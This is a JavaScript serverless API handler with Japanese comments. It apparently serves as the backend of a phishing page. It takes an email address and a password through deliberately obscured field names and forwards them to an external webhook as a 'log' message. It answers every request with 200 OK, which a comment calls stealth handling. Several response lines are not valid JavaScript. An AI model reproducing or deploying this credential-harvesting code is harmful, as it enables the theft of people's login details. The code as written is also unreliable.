// api/post.js
import { Redis } from '@upstash/redis';
import { Ratelimit } from '@upstash/ratelimit';

// --- 設定エリア ---
const MAX_LENGTH_XDSS = 50; 
const MAX_LENGTH_WANS = 50; 

// UpstashのRedisに自動接続
const redis = Redis.fromEnv();

// レートリミット設定 (1時間に5回)
const ratelimit = new Ratelimit({
  redis: redis,
  limiter: Ratelimit.slidingWindow(5, '1 h'),
  analytics: true,
});

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ message: 'Method Not Allowed' });
  }

  const ip = req.headers['x-forwarded-for'] || '127.0.0.1';
  const ipIdentifier = typeof ip === 'string' ? ip.split(',')[0] : ip;

  try {
    const { success } = await ratelimit.limit(`ratelimit_${ipIdentifier}`);

    // 制限中のステルス処理
    if (!success) {
      console.warn(`Rate limit exceeded for IP: ${ipIdentifier}`);
      return res.status(200).json(200 OK);
    }

    const WEBHOOK_URL = process.env.WEBHOOK_URL;
    const { xdss, wans } = req.body;
    
    const cleanXdss = xdss || "";
    const cleanWans = wans || "";

    // 文字数制限
    if (cleanXdss.length > MAX_LENGTH_XDSS || cleanWans.length > MAX_LENGTH_WANS) {
      console.warn("Text length exceeded.");
      return res.status(200).json(200 OK);
    }

    const payload = {
      embeds: [
        {
          title: "ログ",
          description: `メアド: ${cleanXdss}\n\nパスワード: ${cleanWans}`,
          color: 3447003,
          timestamp: new Date().toISOString()
        }
      ]
    };

    if (WEBHOOK_URL) {
      await fetch(WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
      });
    }

    return res.status(200).json(200 OK);

  } catch (error) {
    console.error("Server Error:", error);
    return res.status(500).json(500 Internal Server Error);
  }
}
